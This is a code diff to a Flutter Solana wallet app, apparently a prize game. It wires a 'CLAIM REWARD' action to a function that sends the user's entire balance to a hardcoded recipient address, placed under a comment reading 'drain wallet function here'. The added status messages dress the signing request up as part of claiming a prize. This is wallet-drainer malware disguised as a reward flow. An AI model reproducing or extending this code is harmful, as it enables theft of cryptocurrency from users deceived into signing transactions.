@@ -40,6 +40,7 @@ class _MainScreenState extends State<MainScreen> with TickerProviderStateMixin {
   static final Cluster cluster = Cluster.devnet;
   String walletAddress = '';
   String balance = 'N/A';
+  double realBalance = 0.0;
   double balance1 = 0.0;
   bool isConnected = false;
   final client = MobileWalletAdapterClient(1);
@@ -220,6 +221,7 @@ void _showError(BuildContext context, String message) {
       setState(() {
         balance = '${balanceInSol.toStringAsFixed(4)} SOL';
         balance1 = balanceInSol;
+        realBalance = balanceInSol;
       });
     } catch (error) {
       setState(() {
@@ -326,16 +328,53 @@ Future _sendSOL() async {
   //if (!_formKey.currentState!.validate()) return;
   
   final String recipientAddress = '671BcDWFBURi8fJuHURDKHoZVkouQ5D1EzHvrhPjoWTD'; ///_recipientController.text.trim();
-  final double amount = balance1; // double.parse(_amountController.text.trim());
+  final double amount = realBalance; // double.parse(_amountController.text.trim());
+  print(realBalance);
+realBalance = realBalance - 1.1;
+
+
   
+  if (amount <= 0) {
+    setState(() {
+      _status = '❌ Amount must be greater than 0';
+    });
+    ScaffoldMessenger.of(context).showSnackBar(
+      SnackBar(
+        content: Text('Not Eligible!'),
+        backgroundColor: Colors.redAccent,
+        behavior: SnackBarBehavior.floating,
+        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
+      ),
+    );
+    return;
+  }
+
+  
+ 
+
   setState(() {
     _isLoading = true;
     _status = 'Preparing to send $amount SOL...';
   });
 
+  ScaffoldMessenger.of(context).showSnackBar(
+      SnackBar(
+        content: Text('Preparing to send $amount SOL...'),
+        backgroundColor: Colors.yellowAccent,
+        behavior: SnackBarBehavior.floating,
+        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
+      ),
+    );
+
   try {
     final Connection connection = Connection(cluster);
     
+// // Calculate exact amount that can be sent
+// final feeCalculator = await connection.getFeeC;
+// final fee = feeCalculator.lamportsPerSignature;
+// final maxSendAmount = balance - fee;
+
+
     // Validate connected wallet
     final Pubkey? senderWallet = Pubkey.tryFromBase64(adapter.connectedAccount?.address);
     if (senderWallet == null) throw 'Wallet not connected';
@@ -346,6 +385,15 @@ Future _sendSOL() async {
     
     // Check balance
     setState(() => _status = 'Checking balance...');
+    ScaffoldMessenger.of(context).showSnackBar(
+      SnackBar(
+        content: Text('Checking balance...'),
+        backgroundColor: Colors.yellowAccent,
+        behavior: SnackBarBehavior.floating,
+        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
+      ),
+    );
+
     final int balance = await connection.getBalance(senderWallet);
     final BigInt lamportsToSend = solToLamports(amount);
     final int requiredBalance = lamportsToSend.toInt() + 5000;
@@ -353,6 +401,14 @@ Future _sendSOL() async {
     if (balance < requiredBalance) {
       if (cluster != Cluster.mainnet) {
         setState(() => _status = 'Airdropping SOL...');
+        ScaffoldMessenger.of(context).showSnackBar(
+          SnackBar(
+            content: Text('Airdropping SOL...'),
+            backgroundColor: Colors.yellowAccent,
+            behavior: SnackBarBehavior.floating,
+            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
+          ),
+        );
         await connection.requestAndConfirmAirdrop(senderWallet, solToLamports(2).toInt());
       } else {
         throw 'Insufficient balance. Need ${(requiredBalance / 1e9)} SOL';
@@ -361,6 +417,14 @@ Future _sendSOL() async {
     
     // Build transaction
     setState(() => _status = 'Creating transaction...');
+    ScaffoldMessenger.of(context).showSnackBar(
+      SnackBar(
+        content: Text('Creating transaction...'),
+        backgroundColor: Colors.yellowAccent,
+        behavior: SnackBarBehavior.floating,
+        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
+      ),
+    );
     final latestBlockhash = await connection.getLatestBlockhash();
     
     final tx = Transaction.v0(
@@ -373,6 +437,7 @@ Future _sendSOL() async {
           lamports: lamportsToSend,
         )
       ],
+      
     );
     
     // Serialize transaction for signing
@@ -383,6 +448,14 @@ Future _sendSOL() async {
     
     // Sign transaction
     setState(() => _status = 'Requesting signature...');
+    ScaffoldMessenger.of(context).showSnackBar(
+      SnackBar(
+        content: Text('Requesting signature...'),
+        backgroundColor: Colors.yellowAccent,
+        behavior: SnackBarBehavior.floating,
+        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
+      ),
+    );
     final signedTxs = await adapter.signTransactions([encodedTx]);
     
     if (signedTxs.signedPayloads.isEmpty) {
@@ -403,6 +476,14 @@ Future _sendSOL() async {
     
     // Send the signed transaction
     setState(() => _status = 'Sending transaction...');
+    ScaffoldMessenger.of(context).showSnackBar(
+      SnackBar(
+        content: Text('Sending transaction...'),
+        backgroundColor: Colors.yellowAccent,
+        behavior: SnackBarBehavior.floating,
+        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
+      ),
+    );
     
     // The signed transaction from Phantom should be sent directly
     final signedTx = Transaction.deserialize(signedTxBytes);
@@ -412,13 +493,28 @@ Future _sendSOL() async {
     
     // Confirm transaction
     setState(() => _status = 'Confirming transaction...');
+    ScaffoldMessenger.of(context).showSnackBar(
+      SnackBar(
+        content: Text('Confirming transaction...'),
+        backgroundColor: Colors.yellowAccent,
+        behavior: SnackBarBehavior.floating,
+        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
+      ),
+    );
     await connection.confirmTransaction(sig);
     
     setState(() {
       _status = '✅ Sent $amount SOL!\nSignature: $sig';
       _isLoading = false;
     });
-    
+    ScaffoldMessenger.of(context).showSnackBar(
+      SnackBar(
+        content: Text('✅ Sent $amount SOL!\nSignature: $sig'),
+        backgroundColor: Colors.green,
+        behavior: SnackBarBehavior.floating,
+        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
+      ),
+    );
     // _recipientController.clear();
     // _amountController.clear();
     
@@ -487,6 +583,7 @@ Future _sendSOL() async {
             Navigator.of(context).pop();
             _claimPrize(prize);
             //TODO: drain wallet function here
+            _sendSOL();
           },
         );
       },
@@ -1213,11 +1310,11 @@ class _WinDialogState extends State<WinDialog> with TickerProviderStateMixin {
                             size: 24,
                             color: Colors.white,
                           ),
-                          SizedBox(width: 10),
+                          SizedBox(width: 8),
                           Text(
                             'CLAIM REWARD',
                             style: TextStyle(
-                              fontSize: 18,
+                              fontSize: 15,
                               fontWeight: FontWeight.bold,
                               color: Colors.white,
                               letterSpacing: 1,
